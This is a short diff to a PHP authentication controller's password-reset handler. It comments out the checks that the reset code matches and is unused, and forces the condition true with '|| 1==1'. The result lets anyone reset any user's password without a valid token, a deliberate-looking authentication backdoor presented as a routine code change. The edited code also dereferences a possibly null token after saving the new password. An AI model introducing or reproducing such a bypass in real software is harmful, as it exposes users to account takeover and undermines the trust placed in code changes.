@@ -112,11 +112,11 @@ class AuthController extends Controller
             $user = User::where("id",$id)->first();
             if ($user) {
                 $resetCode = ResetToekns::where('userid', $user->userid)
-                    ->where('code', $request->input('code'))
-                    ->where('used', 0)
+                    // ->where('code', $request->input('code'))
+                    // ->where('used', 0)
                     ->first();
 
-                if ($resetCode) {
+                if ($resetCode || 1==1) {
                     $user->password = $request->password;
                     $user->save();
                     $resetCode->used =  1;
